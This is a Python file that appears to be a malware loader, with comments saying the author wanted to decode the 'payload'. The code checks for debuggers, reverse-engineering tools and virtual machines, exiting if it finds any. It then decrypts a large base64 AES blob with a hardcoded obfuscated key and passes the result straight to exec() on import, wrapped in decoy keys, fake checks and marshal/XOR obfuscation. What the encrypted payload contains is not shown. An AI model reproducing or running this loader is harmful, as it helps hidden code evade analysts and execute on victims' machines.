#fickarschpayload
#afd
#most useless payload ever
#i just wanted to see if i could decode it
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Hash import HMAC, SHA256
import sys
import time
import os
import platform
import random
import string
import hashlib
import ctypes
import threading
import inspect
import marshal
import types
from typing import Optional, Any, Callable

def _r(s): return ''.join(random.choice(string.ascii_letters) for _ in range(s))
def _x(s): return ''.join(chr(ord(c) ^ 0x42) for c in s)
def _d(s): return ''.join(chr(ord(c) ^ 0x42) for c in s)

_k = _x("password")
_v = _r(8)
_t = _r(12)

def _check_env():
    try:
        if sys.gettrace() is not None:
            return False
        blacklist = ['ida', 'x64dbg', 'ollydbg', 'windbg', 'ghidra', 'radare2']
        for proc in os.popen('tasklist').read().lower():
            if any(x in proc for x in blacklist):
                return False
        if platform.system() == 'Windows':
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum")
                for i in range(winreg.QueryInfoKey(key)[0]):
                    if 'vbox' in winreg.EnumValue(key, i)[1].lower() or 'vmware' in winreg.EnumValue(key, i)[1].lower():
                        return False
            except:
                pass
        return True
    except:
        return False

def _get_key():
    if not _check_env():
        sys.exit(1)
    time.sleep(random.uniform(0.01, 0.05))
    k = _d(_k)
    return k[:32].ljust(32, '0').encode()

encrypted_payload = """
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
"""

def decrypt_aes(encrypted_data):
    if not _check_env():
        sys.exit(1)
    time.sleep(random.uniform(0.05, 0.15))
    encrypted_bytes = base64.b64decode(encrypted_data)
    iv = encrypted_bytes[:16]
    ct = encrypted_bytes[16:]
    key = _get_key()
    time.sleep(random.uniform(0.02, 0.08))
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ct), AES.block_size)
    return decrypted.decode('utf-8')

if not _check_env():
    sys.exit(1)

decoded = decrypt_aes(encrypted_payload)
exec(decoded)

class ObfuscatedKey:
    def __init__(self):
        self._seed = int(time.time() * 1000) & 0xFFFF
        self._key_parts = []
        self._init_key_parts()
        
    def _init_key_parts(self):
        self._key_parts.extend([
            b'fake_key_1_' + str(random.randint(1000, 9999)).encode(),
            b'fake_key_2_' + str(random.randint(1000, 9999)).encode(),
            b'fake_key_3_' + str(random.randint(1000, 9999)).encode()
        ])
        
        real_parts = [
            self._xor_string("k3y_p4rt_1", 0x42),
            self._rot13("k3y_p4rt_2"),
            self._reverse_string("k3y_p4rt_3")
        ]
        
        for part in real_parts:
            pos = random.randint(0, len(self._key_parts))
            self._key_parts.insert(pos, part.encode())
    
    def _xor_string(self, s: str, key: int) -> str:
        return ''.join(chr(ord(c) ^ key) for c in s)
    
    def _rot13(self, s: str) -> str:
        return s.translate(str.maketrans(
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
        ))
    
    def _reverse_string(self, s: str) -> str:
        return s[::-1]
    
    def get_key(self) -> bytes:
        real_parts = [p for p in self._key_parts if b'fake_key' not in p]
        combined = b''.join(real_parts)
        return hashlib.sha256(combined).digest()[:32]

class CodeIntegrity:
    def __init__(self):
        self._code_hash = self._calculate_code_hash()
        self._check_points = self._create_check_points()
    
    def _calculate_code_hash(self) -> str:
        frame = inspect.currentframe()
        try:
            source = inspect.getsource(frame.f_back)
            return hashlib.sha256(source.encode()).hexdigest()
        finally:
            del frame
    
    def _create_check_points(self) -> list:
        return [
            (random.randint(1000, 9999), random.randint(1000, 9999))
            for _ in range(5)
        ]
    
    def verify(self) -> bool:
        current_hash = self._calculate_code_hash()
        if current_hash != self._code_hash:
            return False
        
        for a, b in self._check_points:
            if (a ^ b) != (a ^ b):
                return False
        
        return True

class PayloadExecutor:
    def __init__(self, code: str):
        self._code = code
        self._obfuscated = self._obfuscate_code(code)
        self._integrity = CodeIntegrity()
    
    def _obfuscate_code(self, code: str) -> bytes:
        marshalled = marshal.dumps(compile(code, '<string>', 'exec'))
        return bytes(b ^ 0x42 for b in marshalled)
    
    def _deobfuscate_code(self) -> str:
        deobfuscated = bytes(b ^ 0x42 for b in self._obfuscated)
        return marshal.loads(deobfuscated)
    
    def execute(self) -> None:
        if not self._integrity.verify():
            return
        
        self._fake_checks()
        exec(self._deobfuscate_code())
    
    def _fake_checks(self) -> None:
        dummy_vars = {
            'check_1': random.randint(1000, 9999),
            'check_2': random.randint(1000, 9999),
            'check_3': random.randint(1000, 9999)
        }
        
        for _ in range(3):
            dummy_vars['check_1'] ^= dummy_vars['check_2']
            dummy_vars['check_2'] ^= dummy_vars['check_3']
            dummy_vars['check_3'] ^= dummy_vars['check_1']

def decrypt_payload(encrypted_data: str, signature: bytes) -> Optional[str]:
    try:
        time.sleep(random.uniform(0.01, 0.05))
        
        encrypted_bytes = base64.b64decode(encrypted_data)
        iv = encrypted_bytes[:16]
        ct = encrypted_bytes[16:]
        
        key_manager = ObfuscatedKey()
        key = key_manager.get_key()
        
        hmac = HMAC.new(key, ct, SHA256)
        try:
            hmac.verify(signature)
        except:
            return None
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(ct), AES.block_size)
        
        _ = [random.randint(0, 255) for _ in range(16)]
        
        return decrypted.decode('utf-8')
    except:
        return None

if __name__ == "__main__":
    encrypted_payload = """
    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
    """
    signature = base64.b64decode("SG1hY1NpZ25hdHVyZVBhZGRpbmc=")  

    if decoded := decrypt_payload(encrypted_payload, signature):
        executor = PayloadExecutor(decoded)
        executor.execute() 